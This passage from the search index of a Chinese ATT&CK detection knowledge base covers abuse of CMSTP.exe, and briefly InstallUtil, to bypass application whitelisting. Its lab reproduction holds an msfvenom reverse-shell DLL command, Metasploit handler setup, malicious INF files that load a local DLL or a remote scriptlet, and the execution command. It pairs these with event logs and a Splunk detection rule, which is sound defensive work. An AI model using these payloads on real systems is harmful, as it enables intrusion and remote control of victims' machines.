high","title":"sigma\u89c4\u5219"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Compiler.exe%E6%89%A7%E8%A1%8Cpayload/#_10","text":"\u65e0\u5177\u4f53\u68c0\u6d4b\u89c4\u5219\uff0c\u53ef\u6839\u636e\u8fdb\u7a0b\u521b\u5efa\u4e8b\u4ef64688/1\uff08\u8fdb\u7a0b\u540d\u79f0\u3001\u547d\u4ee4\u884c\uff09\u8fdb\u884c\u76d1\u63a7\u3002\u672c\u76d1\u63a7\u65b9\u6cd5\u9700\u8981\u81ea\u884c\u5b89\u88c5\u914d\u7f6e\u5ba1\u6838\u7b56\u7565/sysmon\u3002","title":"\u5efa\u8bae"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Compiler.exe%E6%89%A7%E8%A1%8Cpayload/#_11","text":"MITRE-ATT&CK-T1218-001 https://attack.mitre.org/techniques/T1218/001/ \u57fa\u4e8e\u767d\u540d\u5355Compiler.exe\u6267\u884cpayload\u7b2c\u516d\u5b63 https://micro8.gitbook.io/micro8/contents-1/71-80/76-ji-yu-bai-ming-dan-compiler.exe-zhi-hang-payload-di-liu-ji \u8fdc\u63a7\u514d\u6740\u4e13\u9898(43)-\u767d\u540d\u5355Compiler.exe\u6267\u884cpayload http://sec.nmask.cn/article_content?a_id=1b5c0f6a2e669c7605d42fd88f3f90fb","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-003-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Cmstp.exe%E6%89%A7%E8%A1%8CPayload/","text":"T1218-003-win-\u57fa\u4e8e\u767d\u540d\u5355Cmstp.exe\u6267\u884cPayload \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u5fae\u8f6f\u7684\u547d\u4ee4\u884c\u7a0b\u5e8fCMSTP.exe\u7528\u4e8e\u5b89\u88c5\u8fde\u63a5\u7ba1\u7406\u5668\u670d\u52a1\u914d\u7f6e\u6587\u4ef6\u3002CMSTP.exe\u5c06\u6536\u5230\u7684\u5b89\u88c5\u4fe1\u606f\u6587\u4ef6\uff08INF\uff09\u4f5c\u4e3a\u53c2\u6570\uff0c\u5b89\u88c5\u7528\u4e8e\u8fdc\u7a0b\u8bbf\u95ee\u8fde\u63a5\u7684\u670d\u52a1\u914d\u7f6e\u6587\u4ef6\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5411CMSTP.exe\u63d0\u4f9b\u5e26\u6076\u610f\u547d\u4ee4\u7684INF\u6587\u4ef6\u3002\u4e0eRegsvr32/\"Squiblydoo\"\u7c7b\u4f3c\uff0cCMSTP.exe\u53ef\u80fd\u88ab\u6ee5\u7528\u6765\u4ece\u8fdc\u7a0b\u670d\u52a1\u5668\u52a0\u8f7d\u548c\u6267\u884c\u52a8\u6001\u94fe\u63a5\u5e93\u548c/\u6216COM\u811a\u672c\u5c0f\u7a0b\u5e8f\u3002\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u7528CMSTP.exe\u6765\u7ed5\u8fc7AppLocker\u53ca\u5176\u4ed6\u767d\u540d\u5355\u9632\u5fa1\uff0c\u56e0\u4e3aCMSTP.exe\u672c\u8eab\u662f\u4e00\u4e2a\u5408\u6cd5\u7684\u3001\u5df2\u7b7e\u540d\u7684\u5fae\u8f6f\u5e94\u7528\u3002 CMSTP.exe\u4e5f\u53ef\u80fd\u88ab\u6ee5\u7528\u6765\u7ed5\u8fc7\u7528\u6237\u8d26\u53f7\u63a7\u5236\u5e76\u901a\u8fc7\u81ea\u52a8\u5347\u7ea7\u7684COM\u63a5\u53e3\u6267\u884cINF\u6587\u4ef6\u4e2d\u7684\u4efb\u610f\u6076\u610f\u547d\u4ee4\u3002 \u6d4b\u8bd5\u6848\u4f8b Cmstp\u5b89\u88c5\u6216\u5220\u9664\u201c\u8fde\u63a5\u7ba1\u7406\u5668\u201d\u670d\u52a1\u914d\u7f6e\u6587\u4ef6\u3002\u5982\u679c\u4e0d\u542b\u53ef\u9009\u53c2\u6570\u7684\u60c5\u51b5\u4e0b\u4f7f\u7528\uff0c\u5219 cmstp \u4f1a\u4f7f\u7528\u5bf9\u5e94\u4e8e\u64cd\u4f5c\u7cfb\u7edf\u548c\u7528\u6237\u7684\u6743\u9650\u7684\u9ed8\u8ba4\u8bbe\u7f6e\u6765\u5b89\u88c5\u670d\u52a1\u914d\u7f6e\u6587\u4ef6\u3002 \u5fae\u8f6f\u5b98\u65b9\u6587\u6863\uff1a https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmstp \u8bf4\u660e\uff1aCmstp.exe\u6240\u5728\u8def\u5f84\u5df2\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64\uff0cCmstp\u547d\u4ee4\u53ef\u8bc6\u522b\uff0c\u9700\u6ce8\u610fx86\uff0cx64\u4f4d\u7684Cmstp\u8c03\u7528\u3002 Windows 2003 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a C:\\Windows\\System32\\cmstp.exe C:\\Windows\\SysWOW64\\cmstp.exe Windows 7 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a C:\\Windows\\System32\\cmstp.exe C:\\Windows\\SysWOW64\\cmstp.exe \u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a \u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565>\u8ba1\u7b97\u673a\u914d\u7f6e>\u7ba1\u7406\u6a21\u677f>\u7cfb\u7edf>\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa>\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c>\u542f\u7528 \uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002 \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u914d\u7f6e\uff09 \u6d4b\u8bd5\u590d\u73b0 \u73af\u5883\u51c6\u5907 \u653b\u51fb\u673a\uff1aKali2019 \u9776\u673a\uff1awindows 7 \u653b\u51fb\u5206\u6790 \u751f\u6210payload.dll msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.126.146 LPORT=53 -f dll -o payload.dll \u6267\u884c\u76d1\u542c \u653b\u51fb\u673a,\u6ce8\u610f\u914d\u7f6eset AutoRunScript migrate f (AutoRunScript\u662fmsf\u4e2d\u4e00\u4e2a\u5f3a\u5927\u7684\u81ea\u52a8\u5316\u7684\u540e\u6e17\u900f\u5de5\u5177\uff0c\u8fd9\u91ccmigrate\u53c2\u6570\u662f\u8fc1\u79fb\u6728\u9a6c\u5230\u5176\u4ed6\u8fdb\u7a0b) msf5 > use exploit/multi/handler msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp payload => windows/meterpreter/reverse_tcp msf5 exploit(multi/handler) > set lhost 192.168.126.146 lhost => 192.168.126.146 msf5 exploit(multi/handler) > set lport 53 lport => 53 msf5 exploit(multi/handler) > set AutoRunScript migrate -f AutoRunScript => migrate -f msf5 exploit(multi/handler) > exploit inf\u6a21\u677f [version] Signature=$chicago$ AdvancedINF=2.5 [DefaultInstall_SingleUser] UnRegisterOCXs=UnRegisterOCXSection [UnRegisterOCXSection] C:\\payload.dll [Strings] AppAct = \"SOFTWARE\\Microsoft\\Connection Manager\" ServiceName=\"12306Br0\" ShortSvcName=\"12306Br0\" INF\u6587\u4ef6\u7684RegisterOCXSection\u9700\u8981\u5305\u542b\u6076\u610fDLL\u6587\u4ef6\u7684\u672c\u5730\u8def\u5f84\u6216\u8fdc\u7a0b\u6267\u884c\u7684WebDAV\u4f4d\u7f6e \u9776\u673a\u6267\u884cpayload cmstp.exe /ni /s C:\\Users\\12306Br0\\Desktop\\a\\add.inf \u53cd\u5f39shell \u672a\u6210\u529f\u83b7\u53d6\u5230shell \u6d4b\u8bd5\u7559\u75d5 windows\u5b89\u5168\u65e5\u5fd7 \u4e8b\u4ef6ID\uff1a 4688 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0x9b0 \u65b0\u8fdb\u7a0b\u540d: C:\\Windows\\System32\\cmstp.exe sysmon\u65e5\u5fd7 \u4e8b\u4ef6ID\uff1a1 OriginalFileName: CMSTP.EXE CommandLine: cmstp.exe /ni /s C:\\Users\\12306Br0\\Desktop\\a\\add.inf CurrentDirectory: C:\\Windows\\system32\\ User: 12306Br0-PC\\12306Br0 LogonGuid: {bb1f7c32-5fc3-5e99-0000-0020eae10600} LogonId: 0x6e1ea TerminalSessionId: 1 IntegrityLevel: High Hashes: SHA1=BA135738EF1FB2F4C2C6C610BE2C4E855A526668 ParentProcessGuid: {bb1f7c32-fdb7-5e9a-0000-0010563b2d00} ParentProcessId: 1988 ParentImage: C:\\Windows\\System32\\cmd.exe ParentCommandLine: \"C:\\Windows\\System32\\cmd.exe\" inf\u6587\u4ef6\u5185\u5bb9 [version] Signature=$chicago$ AdvancedINF=2.5 [DefaultInstall_SingleUser] UnRegisterOCXs=UnRegisterOCXSection [UnRegisterOCXSection] %11%\\scrobj.dll,NI,http://192.168.1.4/cmstp_rev_53_x64.sct [Strings] AppAct = \"SOFTWARE\\Microsoft\\Connection Manager\" ServiceName=\"Micropoor\" ShortSvcName=\"Micropoor\" \u68c0\u6d4b\u89c4\u5219/\u601d\u8def splunk\u89c4\u5219 index=windows source=\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d (EventCode=1 Image=\u201d*\\\\cmstp.exe\u201d) OR (EventCode=10 SourceImage=\u201d*\\\\cmstp.exe\u201d ) OR (EventCode=10 CallTrace=\u201d*CMLUA.dll*\u201d) (EventCode IN (12,13) TargetObject=\u201d*\\\\CMMGR32.exe\u201d OR (EventCode=12 TargetObject=\u201dHKLM\\\\SOFTWARE\\\\Microsoft\\\\Tracing\\\\cmstp*\u201d) \u5efa\u8bae \u6682\u65e0 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1218-003 https://attack.mitre.org/techniques/T1218/003/ windows\u4e0b\u57fa\u4e8e\u767d\u540d\u5355\u83b7\u53d6shell\u7684\u65b9\u6cd5\u6574\u7406\uff08\u4e0b\uff09 http://www.safe6.cn/article/157#directory030494471069429444 \u57fa\u4e8e\u767d\u540d\u5355Cmstp.exe\u6267\u884cpayload\u7b2c\u5341\u516d\u5b63 https://www.bookstack.cn/read/Micro8/Chapter1-81-90-87_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Cmstp.exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%8D%81%E5%85%AD%E5%AD%A3.md","title":"T1218-003-win-\u57fa\u4e8e\u767d\u540d\u5355Cmstp.exe\u6267\u884cPayload"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-003-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Cmstp.exe%E6%89%A7%E8%A1%8CPayload/#t1218-003-win-cmstpexepayload","text":"","title":"T1218-003-win-\u57fa\u4e8e\u767d\u540d\u5355Cmstp.exe\u6267\u884cPayload"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-003-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Cmstp.exe%E6%89%A7%E8%A1%8CPayload/#attck","text":"\u5fae\u8f6f\u7684\u547d\u4ee4\u884c\u7a0b\u5e8fCMSTP.exe\u7528\u4e8e\u5b89\u88c5\u8fde\u63a5\u7ba1\u7406\u5668\u670d\u52a1\u914d\u7f6e\u6587\u4ef6\u3002CMSTP.exe\u5c06\u6536\u5230\u7684\u5b89\u88c5\u4fe1\u606f\u6587\u4ef6\uff08INF\uff09\u4f5c\u4e3a\u53c2\u6570\uff0c\u5b89\u88c5\u7528\u4e8e\u8fdc\u7a0b\u8bbf\u95ee\u8fde\u63a5\u7684\u670d\u52a1\u914d\u7f6e\u6587\u4ef6\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5411CMSTP.exe\u63d0\u4f9b\u5e26\u6076\u610f\u547d\u4ee4\u7684INF\u6587\u4ef6\u3002\u4e0eRegsvr32/\"Squiblydoo\"\u7c7b\u4f3c\uff0cCMSTP.exe\u53ef\u80fd\u88ab\u6ee5\u7528\u6765\u4ece\u8fdc\u7a0b\u670d\u52a1\u5668\u52a0\u8f7d\u548c\u6267\u884c\u52a8\u6001\u94fe\u63a5\u5e93\u548c/\u6216COM\u811a\u672c\u5c0f\u7a0b\u5e8f\u3002\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u7528CMSTP.exe\u6765\u7ed5\u8fc7AppLocker\u53ca\u5176\u4ed6\u767d\u540d\u5355\u9632\u5fa1\uff0c\u56e0\u4e3aCMSTP.exe\u672c\u8eab\u662f\u4e00\u4e2a\u5408\u6cd5\u7684\u3001\u5df2\u7b7e\u540d\u7684\u5fae\u8f6f\u5e94\u7528\u3002 CMSTP.exe\u4e5f\u53ef\u80fd\u88ab\u6ee5\u7528\u6765\u7ed5\u8fc7\u7528\u6237\u8d26\u53f7\u63a7\u5236\u5e76\u901a\u8fc7\u81ea\u52a8\u5347\u7ea7\u7684COM\u63a5\u53e3\u6267\u884cINF\u6587\u4ef6\u4e2d\u7684\u4efb\u610f\u6076\u610f\u547d\u4ee4\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-003-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Cmstp.exe%E6%89%A7%E8%A1%8CPayload/#_1","text":"Cmstp\u5b89\u88c5\u6216\u5220\u9664\u201c\u8fde\u63a5\u7ba1\u7406\u5668\u201d\u670d\u52a1\u914d\u7f6e\u6587\u4ef6\u3002\u5982\u679c\u4e0d\u542b\u53ef\u9009\u53c2\u6570\u7684\u60c5\u51b5\u4e0b\u4f7f\u7528\uff0c\u5219 cmstp \u4f1a\u4f7f\u7528\u5bf9\u5e94\u4e8e\u64cd\u4f5c\u7cfb\u7edf\u548c\u7528\u6237\u7684\u6743\u9650\u7684\u9ed8\u8ba4\u8bbe\u7f6e\u6765\u5b89\u88c5\u670d\u52a1\u914d\u7f6e\u6587\u4ef6\u3002 \u5fae\u8f6f\u5b98\u65b9\u6587\u6863\uff1a https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmstp \u8bf4\u660e\uff1aCmstp.exe\u6240\u5728\u8def\u5f84\u5df2\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64\uff0cCmstp\u547d\u4ee4\u53ef\u8bc6\u522b\uff0c\u9700\u6ce8\u610fx86\uff0cx64\u4f4d\u7684Cmstp\u8c03\u7528\u3002 Windows 2003 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a C:\\Windows\\System32\\cmstp.exe C:\\Windows\\SysWOW64\\cmstp.exe Windows 7 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a C:\\Windows\\System32\\cmstp.exe C:\\Windows\\SysWOW64\\cmstp.exe \u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a \u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565>\u8ba1\u7b97\u673a\u914d\u7f6e>\u7ba1\u7406\u6a21\u677f>\u7cfb\u7edf>\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa>\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c>\u542f\u7528 \uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-003-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Cmstp.exe%E6%89%A7%E8%A1%8CPayload/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u914d\u7f6e\uff09","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-003-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Cmstp.exe%E6%89%A7%E8%A1%8CPayload/#_3","text":"","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-003-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Cmstp.exe%E6%89%A7%E8%A1%8CPayload/#_4","text":"\u653b\u51fb\u673a\uff1aKali2019 \u9776\u673a\uff1awindows 7","title":"\u73af\u5883\u51c6\u5907"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-003-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Cmstp.exe%E6%89%A7%E8%A1%8CPayload/#_5","text":"","title":"\u653b\u51fb\u5206\u6790"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-003-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Cmstp.exe%E6%89%A7%E8%A1%8CPayload/#payloaddll","text":"msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.126.146 LPORT=53 -f dll -o payload.dll","title":"\u751f\u6210payload.dll"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-003-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Cmstp.exe%E6%89%A7%E8%A1%8CPayload/#_6","text":"\u653b\u51fb\u673a,\u6ce8\u610f\u914d\u7f6eset AutoRunScript migrate f (AutoRunScript\u662fmsf\u4e2d\u4e00\u4e2a\u5f3a\u5927\u7684\u81ea\u52a8\u5316\u7684\u540e\u6e17\u900f\u5de5\u5177\uff0c\u8fd9\u91ccmigrate\u53c2\u6570\u662f\u8fc1\u79fb\u6728\u9a6c\u5230\u5176\u4ed6\u8fdb\u7a0b) msf5 > use exploit/multi/handler msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp payload => windows/meterpreter/reverse_tcp msf5 exploit(multi/handler) > set lhost 192.168.126.146 lhost => 192.168.126.146 msf5 exploit(multi/handler) > set lport 53 lport => 53 msf5 exploit(multi/handler) > set AutoRunScript migrate -f AutoRunScript => migrate -f msf5 exploit(multi/handler) > exploit","title":"\u6267\u884c\u76d1\u542c"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-003-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Cmstp.exe%E6%89%A7%E8%A1%8CPayload/#inf","text":"[version] Signature=$chicago$ AdvancedINF=2.5 [DefaultInstall_SingleUser] UnRegisterOCXs=UnRegisterOCXSection [UnRegisterOCXSection] C:\\payload.dll [Strings] AppAct = \"SOFTWARE\\Microsoft\\Connection Manager\" ServiceName=\"12306Br0\" ShortSvcName=\"12306Br0\" INF\u6587\u4ef6\u7684RegisterOCXSection\u9700\u8981\u5305\u542b\u6076\u610fDLL\u6587\u4ef6\u7684\u672c\u5730\u8def\u5f84\u6216\u8fdc\u7a0b\u6267\u884c\u7684WebDAV\u4f4d\u7f6e","title":"inf\u6a21\u677f"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-003-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Cmstp.exe%E6%89%A7%E8%A1%8CPayload/#payload","text":"cmstp.exe /ni /s C:\\Users\\12306Br0\\Desktop\\a\\add.inf","title":"\u9776\u673a\u6267\u884cpayload"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-003-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Cmstp.exe%E6%89%A7%E8%A1%8CPayload/#shell","text":"\u672a\u6210\u529f\u83b7\u53d6\u5230shell","title":"\u53cd\u5f39shell"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-003-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Cmstp.exe%E6%89%A7%E8%A1%8CPayload/#_7","text":"windows\u5b89\u5168\u65e5\u5fd7 \u4e8b\u4ef6ID\uff1a 4688 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0x9b0 \u65b0\u8fdb\u7a0b\u540d: C:\\Windows\\System32\\cmstp.exe sysmon\u65e5\u5fd7 \u4e8b\u4ef6ID\uff1a1 OriginalFileName: CMSTP.EXE CommandLine: cmstp.exe /ni /s C:\\Users\\12306Br0\\Desktop\\a\\add.inf CurrentDirectory: C:\\Windows\\system32\\ User: 12306Br0-PC\\12306Br0 LogonGuid: {bb1f7c32-5fc3-5e99-0000-0020eae10600} LogonId: 0x6e1ea TerminalSessionId: 1 IntegrityLevel: High Hashes: SHA1=BA135738EF1FB2F4C2C6C610BE2C4E855A526668 ParentProcessGuid: {bb1f7c32-fdb7-5e9a-0000-0010563b2d00} ParentProcessId: 1988 ParentImage: C:\\Windows\\System32\\cmd.exe ParentCommandLine: \"C:\\Windows\\System32\\cmd.exe\"","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-003-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Cmstp.exe%E6%89%A7%E8%A1%8CPayload/#inf_1","text":"[version] Signature=$chicago$ AdvancedINF=2.5 [DefaultInstall_SingleUser] UnRegisterOCXs=UnRegisterOCXSection [UnRegisterOCXSection] %11%\\scrobj.dll,NI,http://192.168.1.4/cmstp_rev_53_x64.sct [Strings] AppAct = \"SOFTWARE\\Microsoft\\Connection Manager\" ServiceName=\"Micropoor\" ShortSvcName=\"Micropoor\"","title":"inf\u6587\u4ef6\u5185\u5bb9"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-003-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Cmstp.exe%E6%89%A7%E8%A1%8CPayload/#_8","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-003-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Cmstp.exe%E6%89%A7%E8%A1%8CPayload/#splunk","text":"index=windows source=\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d (EventCode=1 Image=\u201d*\\\\cmstp.exe\u201d) OR (EventCode=10 SourceImage=\u201d*\\\\cmstp.exe\u201d ) OR (EventCode=10 CallTrace=\u201d*CMLUA.dll*\u201d) (EventCode IN (12,13) TargetObject=\u201d*\\\\CMMGR32.exe\u201d OR (EventCode=12 TargetObject=\u201dHKLM\\\\SOFTWARE\\\\Microsoft\\\\Tracing\\\\cmstp*\u201d)","title":"splunk\u89c4\u5219"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-003-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Cmstp.exe%E6%89%A7%E8%A1%8CPayload/#_9","text":"\u6682\u65e0","title":"\u5efa\u8bae"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-003-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Cmstp.exe%E6%89%A7%E8%A1%8CPayload/#_10","text":"MITRE-ATT&CK-T1218-003 https://attack.mitre.org/techniques/T1218/003/ windows\u4e0b\u57fa\u4e8e\u767d\u540d\u5355\u83b7\u53d6shell\u7684\u65b9\u6cd5\u6574\u7406\uff08\u4e0b\uff09 http://www.safe6.cn/article/157#directory030494471069429444 \u57fa\u4e8e\u767d\u540d\u5355Cmstp.exe\u6267\u884cpayload\u7b2c\u5341\u516d\u5b63 https://www.bookstack.cn/read/Micro8/Chapter1-81-90-87_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Cmstp.exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%8D%81%E5%85%AD%E5%AD%A3.md","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Installutil.exe%E6%89%A7%E8%A1%8Cpayload/","text":"T1218-004-win-\u57fa\u4e8e\u767d\u540d\u5355Installutil.exe\u6267\u884cpayload \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u547d\u4ee4\u884c\u5b9e\u7528\u7a0b\u5e8fInstallUtil\u53ef\u7528\u4e8e\u901a\u8fc7\u6267\u884c.NET\u4e8c\u8fdb\u5236\u6587\u4ef6\u4e2d\u6307\u5b9a\u7684\u7279\u5b9a\u5b89\u88c5\u7a0b\u5e8f\u7ec4\u4ef6\u6765\u5b89\u88c5\u548c\u5378\u8f7d\u8d44\u6e90\u3002 InstallUtil\u4f4d\u4e8eWindows\u7cfb\u7edf\u4e0a\u7684.NET\u76ee\u5f55\u4e2d\uff1a C:\\Windows\\Microsoft.NET\\Framework\\v\\InstallUtil.exe C:\\Windows\\Microsoft.NET\\Framework64\\v\\InstallUtil.exe InstallUtil.exe\u7531Microsoft\u8fdb\u884c\u6570\u5b57\u7b7e\u540d\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528InstallUtil\u901a\u8fc7\u53d7\u4fe1\u4efb\u7684Windows\u5b9e\u7528\u7a0b\u5e8f\u6765\u4ee3\u7406\u6267\u884c\u4ee3\u7801\u3002\u653b\u51fb\u8005\u8fd8\u53ef\u4ee5\u7528Installutil\u6765\u7ed5\u8fc7\u8fdb\u7a0b\u767d\u540d\u5355\uff0c\u65b9\u6cd5\u662f\u5728\u4e8c\u8fdb\u5236\u6587\u4ef6\u4e2d\u4f7f\u7528\u5c5e\u6027\uff0c\u8fd9\u4e9b\u5c5e\u6027\u6267\u884c\u7528\u5c5e\u6027[System.ComponentModel.RunInstaller(true)]\u4fee\u9970\u7684\u7c7b\u3002 \u6d4b\u8bd5\u6848\u4f8b \u8bf4\u660e\uff1aInstallutil.exe\u6240\u5728\u8def\u5f84\u6ca1\u6709\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64\uff0cInstallutil\u547d\u4ee4\u65e0\u6cd5\u8bc6\u522b\u3002 \u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a \u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565>\u8ba1\u7b97\u673a\u914d\u7f6e>\u7ba1\u7406\u6a21\u677f>\u7cfb\u7edf>\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa>\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c>\u542f\u7528 \uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002 \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7/SYSMON\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u5b89\u88c5\uff09 \u6d4b\u8bd5\u590d\u73b0 \u73af\u5883\u51c6\u5907 \u653b\u51fb\u673a\uff1aKali2019 \u9776\u673a\uff1awindows server 2012 \u653b\u51fb\u5206\u6790 x64 CS using System;using System.Net;using System.Linq;using System.Net.Sockets;using System.Runtime.InteropServices;using System.Threading;using System.Configuration.Install;using System.Windows.Forms; public class GQLBigHgUniLuVx { public static void Main() { while(true) 